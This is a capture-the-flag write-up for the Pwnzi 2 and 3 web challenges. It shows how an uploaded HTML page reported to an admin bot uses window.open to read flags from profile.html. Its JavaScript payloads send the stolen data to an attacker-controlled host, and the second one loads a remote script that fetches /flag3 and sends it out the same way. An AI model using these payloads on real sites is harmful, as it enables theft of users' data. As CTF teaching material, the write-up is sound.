# Pwnzi 2&3 (web, 117+2p & 127+2p, 42 & 37 solved)

## Overview

We start off where we left the part 1 of the task.
We managed to buy all the file upload perks and now we focus on the `report` to admin, file upload and getting flag 2 and 3.
We're putting both here because we used exactly the same, unintended, solution to get both flags.

Quick recap:

- We can upload any file, incluing html with javascript.
- Files are uploaded on the same domain, so we have the same origin.
- We can report our uploaded files to the admin and he will open them.
- Flags can only be seen from `profile.html` referer, and while at least flag 2 is loaded on profile page, flag 3 is not.
- Any page, including `profile.html` is protected against loading inside an Iframe

## Unexpected shortcoming of admin's browser

We spent some time trying to figure out how we can spoof the referer from JS script loaded on page we report to admin, or bypass the iframe limitation, but with no luck.

Then we found: https://lcamtuf.coredump.cx/switch/

The idea behind this is trivial: if you open a new page via `window.open()` then you have full control over this page and it's content.
The only issue is that it's a popup.
We initially immediately assumed it won't work, because popup will get blocked.
It's exactly what happened for us when we did a sanity check.

However, just to be thorough, we tested this on the admin, and it worked just fine!

## Stealing flag 2

The idea is pretty simple, we can just report page:

```html
<html>
<script>
var w = window.open("https://pwnzi.ctf.spamandhex.com/profile.html");
setTimeout(xakep, 1000);

function xakep() {
    var flag = w.document.getElementsByClassName("form-control")[4].innerHTML
    let xhr = new XMLHttpRequest();
    xhr.open("GET", "https://our.page/?"+btoa(flag));
    xhr.send();
}
</script>
</html>
```

We just open the profile page, and once it's loaded we steal the content of the flag2 and send it back to host we control.
This way we get: `SaF{service_workers_are_useless_they_say}`

Judging by the flag, this was not the intended way...

## Stealing flag 3

It should be obvious now, that with the level of control we have, we can steal flag 3 using the same approach.
The only trick is that we need to modify the DOM of `profile.html` once it's open, and add a script loading flag 3 for us:

```html
<html>
<script>
var w = window.open("https://pwnzi.ctf.spamandhex.com/profile.html");
setTimeout(xakep, 1000);

function xakep() {
    body = w.document.querySelector("body");
    let s = document.createElement("script");
    s.src = "https://our.host/payload.js";
    body.appendChild(s);
}
</script>
</html>
```

And the payload is:

```js
let xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(e) {
    document.location.href = "https://our.host/?" + btoa(xhr.responseText);
}
xhr.open("GET", "/flag3");
xhr.send();
```

This way we get back: `SaF{I never lose, I either win or I learn}`
